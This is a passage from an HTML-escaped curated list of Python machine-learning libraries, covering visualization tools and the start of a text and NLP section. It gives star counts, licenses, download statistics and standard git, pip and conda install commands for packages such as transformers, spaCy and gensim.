width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/ing-bank/popmon&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 14 · 🔀 19 · 📥 14 · 📦 11 · 📋 38 - 55% open · ⏱️ 20.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/ing-bank/popmon&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/popmon&#34;&gt;PyPi&lt;/a&gt; (📥 12K / month · 📦 2 · ⏱️ 20.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install popmon&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/leotac/joypy&#34;&gt;joypy&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 420) - Joyplots in Python with matplotlib &amp;amp; pandas. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/leotac/joypy&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 6 · 🔀 47 · 📦 160 · 📋 48 - 22% open · ⏱️ 19.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/leotac/joypy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/joypy&#34;&gt;PyPi&lt;/a&gt; (📥 23K / month · 📦 5 · ⏱️ 19.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install joypy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/joypy&#34;&gt;Conda&lt;/a&gt; (📥 13K · ⏱️ 28.12.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge joypy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/gyli/PyWaffle&#34;&gt;PyWaffle&lt;/a&gt;&lt;/b&gt; (🥉20 · ⭐ 490) - Make Waffle Charts in Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/gyli/PyWaffle&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 6 · 🔀 88 · 📦 130 · 📋 16 - 25% open · ⏱️ 21.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/gyli/PyWaffle&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pywaffle&#34;&gt;PyPi&lt;/a&gt; (📥 3K / month · 📦 1 · ⏱️ 21.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pywaffle&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/pywaffle&#34;&gt;Conda&lt;/a&gt; (📥 4.5K · ⏱️ 22.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge pywaffle&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;Show 13 hidden projects...&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/SciTools/cartopy&#34;&gt;cartopy&lt;/a&gt;&lt;/b&gt; (🥈31 · ⭐ 1.1K) - Cartopy - a cartographic python library with matplotlib support. &lt;code&gt;&lt;a href=&#34;http://bit.ly/37RvQcA&#34;&gt;❗️LGPL-3.0&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/santosjorge/cufflinks&#34;&gt;Cufflinks&lt;/a&gt;&lt;/b&gt; (🥉29 · ⭐ 2.6K · 💀) - Productivity Tools for Plotly + Pandas. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1S&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/DmitryUlyanov/Multicore-TSNE&#34;&gt;Multicore-TSNE&lt;/a&gt;&lt;/b&gt; (🥉25 · ⭐ 1.7K · 💀) - Parallel t-SNE implementation with Python and Torch.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/spotify/chartify&#34;&gt;Chartify&lt;/a&gt;&lt;/b&gt; (🥉24 · ⭐ 3.2K · 💀) - Python library that makes it easy for data scientists to create.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/nicolaskruchten/jupyter_pivottablejs&#34;&gt;pivottablejs&lt;/a&gt;&lt;/b&gt; (🥉23 · ⭐ 460 · 💀) - Dragndrop Pivot Tables and Charts for Jupyter/IPython.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1E&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/adamerose/PandasGUI&#34;&gt;PandasGUI&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 2.6K) - A GUI for Pandas DataFrames. &lt;code&gt;&lt;a href=&#34;https://tldrlegal.com/search?q=MIT-0&#34;&gt;❗️MIT-0&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1S&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/SauceCat/PDPbox&#34;&gt;PDPbox&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 680 · 💀) - python partial dependence plot toolbox. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/beringresearch/ivis&#34;&gt;ivis&lt;/a&gt;&lt;/b&gt; (🥉19 · ⭐ 260) - Dimensionality reduction in very large datasets using Siamese.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/t-makaro/animatplot&#34;&gt;animatplot&lt;/a&gt;&lt;/b&gt; (🥉17 · ⭐ 390 · 💀) - A python package for animating plots build on matplotlib. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/altair-viz/pdvega&#34;&gt;pdvega&lt;/a&gt;&lt;/b&gt; (🥉16 · ⭐ 340 · 💀) - Interactive plotting for Pandas using Vega-Lite. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/data-describe/data-describe&#34;&gt;data-describe&lt;/a&gt;&lt;/b&gt; (🥉16 · ⭐ 290) - datadescribe: Pythonic EDA Accelerator for Data Science. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/Zsailer/nx_altair&#34;&gt;nx-altair&lt;/a&gt;&lt;/b&gt; (🥉16 · ⭐ 190 · 💀) - Draw interactive NetworkX graphs with Altair. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1E&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/biovault/nptsne&#34;&gt;nptsne&lt;/a&gt;&lt;/b&gt; (🥉14 · ⭐ 28 · 💀) - nptsne is a numpy compatible python binary package that offers a.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;br&gt; &#xA;&lt;h2&gt;Text Data &amp;amp; NLP&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#contents&#34;&gt;&lt;img align=&#34;right&#34; width=&#34;15&#34; height=&#34;15&#34; src=&#34;https://git.io/JtehR&#34; alt=&#34;Back to top&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Libraries for processing, cleaning, manipulating, and analyzing text data as well as libraries for NLP tasks such as language detection, fuzzy matching, classification, seq2seq learning, conversational AI, keyword extraction, and translation.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/huggingface/transformers&#34;&gt;transformers&lt;/a&gt;&lt;/b&gt; (🥇49 · ⭐ 64K) - Transformers: State-of-the-art Machine Learning for.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/huggingface/transformers&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 1.3K · 🔀 15K · 📥 1.5K · 📦 28K · 📋 9.5K - 5% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/huggingface/transformers&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/transformers&#34;&gt;PyPi&lt;/a&gt; (📥 7.1M / month · 📦 900 · ⏱️ 13.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install transformers&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/transformers&#34;&gt;Conda&lt;/a&gt; (📥 210K · ⏱️ 22.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge transformers&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/nltk/nltk&#34;&gt;nltk&lt;/a&gt;&lt;/b&gt; (🥇45 · ⭐ 11K · 📈) - Suite of libraries and programs for symbolic and statistical natural.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/nltk/nltk&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 420 · 🔀 2.6K · 📦 140K · 📋 1.6K - 13% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/nltk/nltk&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/nltk&#34;&gt;PyPi&lt;/a&gt; (📥 14M / month · 📦 12K · ⏱️ 09.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install nltk&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/nltk&#34;&gt;Conda&lt;/a&gt; (📥 1.3M · ⏱️ 29.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge nltk&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/explosion/spaCy&#34;&gt;spaCy&lt;/a&gt;&lt;/b&gt; (🥇44 · ⭐ 23K) - Industrial-strength Natural Language Processing (NLP) in Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/explosion/spaCy&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 680 · 🔀 3.8K · 📥 3.1K · 📦 39K · 📋 5.1K - 1% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/explosion/spaCy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/spacy&#34;&gt;PyPi&lt;/a&gt; (📥 6.3M / month · 📦 2.3K · ⏱️ 05.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install spacy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/spacy&#34;&gt;Conda&lt;/a&gt; (📥 2.6M · ⏱️ 03.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge spacy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/RaRe-Technologies/gensim&#34;&gt;gensim&lt;/a&gt;&lt;/b&gt; (🥇42 · ⭐ 13K) - Topic Modelling for Humans. &lt;code&gt;&lt;a href=&#34;https://tldrlegal.com/search?q=LGPL-2.1&#34;&gt;❗️LGPL-2.1&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/RaRe-Technologies/gensim&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 430 · 🔀 4.2K · 📥 3.8K · 📦 33K · 📋 1.8K - 21% open · ⏱️ 06.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/RaRe-Technologies/gensim&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/gensim&#34;&gt;PyPi&lt;/a&gt; (📥 6.8M / month · 📦 2.9K · ⏱️ 01.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install gensim&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/gensim&#34;&gt;Conda&lt;/a&gt; (📥 800K · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge gensim&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/RasaHQ/rasa&#34;&gt;Rasa&lt;/a&gt;&lt;/b&gt; (🥇39 · ⭐ 14K) - Open source machine learning framework to automate text- and voice-.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/RasaHQ/rasa&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 540 · 🔀 4K · 📋 6.6K - 14% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/RasaHQ/rasa&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/rasa&#34;&gt;PyPi&lt;/a&gt; (📥 160K / month · 📦 59 · ⏱️ 20.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install rasa&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/flairNLP/flair&#34;&gt;flair&lt;/a&gt;&lt;/b&gt; (🥇39 · ⭐ 12K) - A very simple framework for state-of-the-art Natural Language Processing.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/flairNLP/flair&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 230 · 🔀 1.9K · 📦 1.4K · 📋 1.9K - 5% open · ⏱️ 20.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/flairNLP/flair&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/flair&#34;&gt;PyPi&lt;/a&gt; (📥 88K / month · 📦 72 · ⏱️ 20.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install flair&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/python-flair&#34;&gt;Conda&lt;/a&gt; (📥 7.7K · ⏱️ 21.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge python-flair&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/allenai/allennlp&#34;&gt;AllenNLP&lt;/a&gt;&lt;/b&gt; (🥇38 · ⭐ 11K) - An open-source NLP research library, built on PyTorch. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/allenai/allennlp&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 260 · 🔀 2.2K · 📥 46 · 📦 2.5K · 📋 2.5K - 3% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/allenai/allennlp&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/allennlp&#34;&gt;PyPi&lt;/a&gt; (📥 59K / month · 📦 180 · ⏱️ 14.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install allennlp&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/allennlp&#34;&gt;Conda&lt;/a&gt; (📥 58K · ⏱️ 15.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge allennlp&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/facebookresearch/fairseq&#34;&gt;fairseq&lt;/a&gt;&lt;/b&gt; (🥇36 · ⭐ 17K) - Facebook AI Research Sequence-to-Sequence Toolkit written in Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/facebookresearch/fairseq&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 390 · 🔀 4.5K · 📥 240 · 📦 800 · 📋 3.4K - 16% open · ⏱️ 23.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/pytorch/fairseq&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/fairseq&#34;&gt;PyPi&lt;/a&gt; (📥 53K / month · 📦 37 · ⏱️ 05.01.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install fairseq&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/fairseq&#34;&gt;Conda&lt;/a&gt; (📥 14K · ⏱️ 28.04.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge fairseq&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/gunthercox/ChatterBot&#34;&gt;ChatterBot&lt;/a&gt;&lt;/b&gt; (🥇36 · ⭐ 12K · 💤) - ChatterBot is a machine learning, conversational dialog engine.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/gunthercox/ChatterBot&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 100 · 🔀 4.1K · 📦 4.4K · 📋 1.6K - 20% open · ⏱️ 01.06.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/gunthercox/ChatterBot&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/chatterbot&#34;&gt;PyPi&lt;/a&gt; (📥 83K / month · 📦 350 · ⏱️ 22.08.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install chatterbot&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/facebookresearch/ParlAI&#34;&gt;ParlAI&lt;/a&gt;&lt;/b&gt; (🥇35 · ⭐ 8.8K) - A framework for training and evaluating AI models on a variety of.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/facebookresearch/ParlAI&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 180 · 🔀 1.8K · 📦 77 · 📋 1.3K - 6% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/facebookresearch/ParlAI&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/parlai&#34;&gt;PyPi&lt;/a&gt; (📥 1.8K / month · 📦 3 · ⏱️ 30.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install parlai&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/UKPLab/sentence-transformers&#34;&gt;sentence-transformers&lt;/a&gt;&lt;/b&gt; (🥇35 · ⭐ 7.8K) - Multilingual Sentence &amp;amp; Image Embeddings with BERT. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/UKPLab/sentence-transformers&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 79 · 🔀 1.5K · 📦 3.3K · 📋 1.4K - 51% open · ⏱️ 12.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/UKPLab/sentence-transformers&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/sentence-transformers&#34;&gt;PyPi&lt;/a&gt; (📥 3.3M / month · 📦 110 · ⏱️ 10.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install sentence-transformers&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/sentence-transformers&#34;&gt;Conda&lt;/a&gt; (📥 21K · ⏱️ 20.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge sentence-transformers&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; 